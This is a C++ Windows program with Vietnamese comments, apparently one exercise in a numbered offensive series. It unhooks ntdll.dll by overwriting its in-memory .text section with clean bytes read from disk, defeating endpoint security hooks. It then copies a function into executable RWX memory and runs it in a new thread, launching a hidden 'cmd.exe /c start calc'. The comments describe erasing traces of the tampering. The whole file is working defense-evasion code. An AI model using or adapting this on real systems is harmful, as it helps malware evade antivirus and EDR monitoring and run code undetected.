#include <windows.h>
#include <iostream>

// 1. Định nghĩa cấu trúc dữ liệu con trỏ tuyệt đối để vận hành độc lập vị trí
typedef UINT(WINAPI* fnWinExec)(LPCSTR lpCmdLine, UINT uCmdShow);

typedef struct _THREAD_DATA {
    fnWinExec pWinExec;       // Địa chỉ tuyệt đối của hàm WinExec trên RAM
    char szCommand[32];       // Chuỗi lệnh thực thi chức năng mở máy tính
} THREAD_DATA, * PTHREAD_DATA;

// 2. Hàm chức năng độc lập vị trí gánh luồng chạy nội bộ trên nền tảng phẳng sạch
DWORD WINAPI LaunchCalculatorUnhooked(LPVOID lpParam) {
    PTHREAD_DATA pData = (PTHREAD_DATA)lpParam;
    if (pData && pData->pWinExec) {
        // Khai hỏa bằng địa chỉ tuyệt đối, bẻ gãy hoàn toàn lỗi địa chỉ tương đối RIP
        pData->pWinExec(pData->szCommand, SW_HIDE);
    }
    return 0;
}

// Hàm gỡ bẫy giám sát Unhook ntdll sử dụng cơ chế đọc file thô an toàn, bẻ gãy rào cản SEC_IMAGE
BOOL UnhookNtdllRaw() {
    PCSTR ntdllPath = "C:\\Windows\\System32\\ntdll.dll";
    HMODULE hNtdllLocal = GetModuleHandleA("ntdll.dll");
    if (!hNtdllLocal) return FALSE;

    // 1. Mở tệp tin ntdll.dll nguyên bản dạng đọc tệp thô phẳng sạch
    HANDLE hFile = CreateFileA(ntdllPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;

    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize == INVALID_FILE_SIZE) { CloseHandle(hFile); return FALSE; }

    // 2. Sử dụng File Mapping tiêu chuẩn hoàn toàn không dùng cờ SEC_IMAGE để bảo an
    HANDLE hFileMapping = CreateFileMapping(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
    if (!hFileMapping) { CloseHandle(hFile); return FALSE; }

    LPVOID pMappingBuffer = MapViewOfFile(hFileMapping, FILE_MAP_READ, 0, 0, 0);
    if (!pMappingBuffer) { CloseHandle(hFileMapping); CloseHandle(hFile); return FALSE; }

    // 3. Giải phẫu PE Headers tường minh kiến trúc x64 bảo đảm tính toán toán học chính xác
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)pMappingBuffer;
    PIMAGE_NT_HEADERS64 ntHeaders = (PIMAGE_NT_HEADERS64)((ULONG_PTR)pMappingBuffer + dosHeader->e_lfanew);

    for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        PIMAGE_SECTION_HEADER sectionHeader = (PIMAGE_SECTION_HEADER)((ULONG_PTR)IMAGE_FIRST_SECTION(ntHeaders) + (i * sizeof(IMAGE_SECTION_HEADER)));

        // Săn lùng phân vùng mã máy thực thi hệ thống (.text Segment)
        if (strcmp((const char*)sectionHeader->Name, ".text") == 0) {

            // Toạ độ vùng nhớ bị Hook inside tiến trình hiện tại
            PVOID pLocalTextSection = (PVOID)((ULONG_PTR)hNtdllLocal + sectionHeader->VirtualAddress);

            // ĐỘT PHÁ TOÁN HỌC x64: Xác định vị trí byte sạch dựa trên PointerToRawData của file thô thay vì VirtualAddress
            PVOID pCleanTextSection = (PVOID)((ULONG_PTR)pMappingBuffer + sectionHeader->PointerToRawData);
            SIZE_T sectionSize = sectionHeader->Misc.VirtualSize;

            // 4. Lật quyền trang nhớ ntdll đang chạy sang RWX để chuẩn bị ghi đè dữ liệu sạch
            DWORD oldProtect = 0;
            BOOL isProtected = VirtualProtect(pLocalTextSection, sectionSize, PAGE_EXECUTE_READWRITE, &oldProtect);

            if (isProtected) {
                // 5. Ghi đè toàn bộ byte nguyên bản sạch đè bẹp bẫy giám sát ngầm inside lòng ntdll
                RtlCopyMemory(pLocalTextSection, pCleanTextSection, sectionSize);

                // Khôi phục lại trạng thái bảo vệ bộ nhớ ảo ban đầu để xóa sạch dấu vết can thiệp
                VirtualProtect(pLocalTextSection, sectionSize, oldProtect, &oldProtect);
            }
            break;
        }
    }

    // Thu hồi tài nguyên bộ đệm Mapping cục bộ phẳng sạch
    UnmapViewOfFile(pMappingBuffer);
    CloseHandle(hFileMapping);
    CloseHandle(hFile);
    return TRUE;
}

int main() {
    std::cout << "====================================================" << std::endl;
    std::cout << "[*] PE 07: NTDLL UNHOOK LAGOS ISLAND (CALC.EXE)" << std::endl;
    std::cout << "====================================================" << std::endl;

    std::cout << "[*] Dang khoi dong quy trinh Unhook dung file tho an toan..." << std::endl;
    if (!UnhookNtdllRaw()) {
        std::cerr << "[-] Unhooking NTDLL Failed!" << std::endl;
        std::cout << "[*] Nhan Enter de dong..." << std::endl;
        std::cin.get();
        return EXIT_FAILURE;
    }
    std::cout << "[+] KHAI XUAN THANH CONG: Ntdll.dll da phang sach nguyen ban 100%!" << std::endl;

    // Quy trình áp dụng cấp phát động thích ứng vừa vặn (Zero Static Buffers)
    SIZE_T functionSize = 500;

    // 1. Cấp phát vùng nhớ thực thi cục bộ
    LPVOID localCodeBuffer = VirtualAlloc(NULL, functionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!localCodeBuffer) {
        std::cerr << "[-] VirtualAlloc cap phat bo nho ma may that bai!" << std::endl;
        std::cin.get();
        return EXIT_FAILURE;
    }
    std::cout << "[+] Vung nho Code RWX thiet lap tai: 0x" << std::hex << localCodeBuffer << std::endl;

    // 2. Cấp phát vùng nhớ chứa tham số dữ liệu tuyệt đối mang quyền RW
    PTHREAD_DATA pLocalData = (PTHREAD_DATA)VirtualAlloc(NULL, sizeof(THREAD_DATA), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pLocalData) {
        VirtualFree(localCodeBuffer, 0, MEM_RELEASE);
        return EXIT_FAILURE;
    }

    // 3. Khởi tạo con trỏ tuyệt đối WinExec bẻ gãy hoàn toàn rào cản Import Table
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (hKernel32) {
        pLocalData->pWinExec = (fnWinExec)GetProcAddress(hKernel32, "WinExec");
    }
    strcpy_s(pLocalData->szCommand, "cmd.exe /c start calc");

    // 4. Sao chép thân hàm vào RAM thực thi cục bộ một cách hợp pháp
    RtlCopyMemory(localCodeBuffer, (LPVOID)LaunchCalculatorUnhooked, functionSize);
    std::cout << "[+] Sao chep logic ham vao RAM hoan tat." << std::endl;

    std::cout << "[*] Dang khoi tao luong Thread thuc thi chuc nang..." << std::endl;

    // 5. Khai hỏa luồng nội bộ thực thi chức năng mở máy tính trên một nền tảng ntdll đã phẳng sạch
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)localCodeBuffer, pLocalData, 0, NULL);
    if (!hThread) {
        std::cerr << "[-] CreateThread failed!" << std::endl;
        VirtualFree(localCodeBuffer, 0, MEM_RELEASE);
        VirtualFree(pLocalData, 0, MEM_RELEASE);
        std::cin.get();
        return EXIT_FAILURE;
    }

    // Cấu hình cờ chờ đợi INFINITE gánh luồng xử lý dứt điểm phẳng sạch
    WaitForSingleObject(hThread, INFINITE);
    std::cout << "[+] Luong Thread chuc nang da hoan thanh chu ky song." << std::endl;

    // 6. Dọn dẹp bộ nhớ triệt để chống rò rỉ tài nguyên hệ thống (Memory Leak)
    CloseHandle(hThread);
    VirtualFree(localCodeBuffer, 0, MEM_RELEASE);
    VirtualFree(pLocalData, 0, MEM_RELEASE);
    std::cout << "[+] Quy trinh giai phong RAM hoan tat." << std::endl;

    std::cout << "\n[+] PE 07: NTDLL Unhooked & Code Executed Successfully!" << std::endl;
    std::cout << "[*] Nhan phim Enter de ket thuc chuong trinh..." << std::endl;
    std::cin.get();
    return EXIT_SUCCESS;
}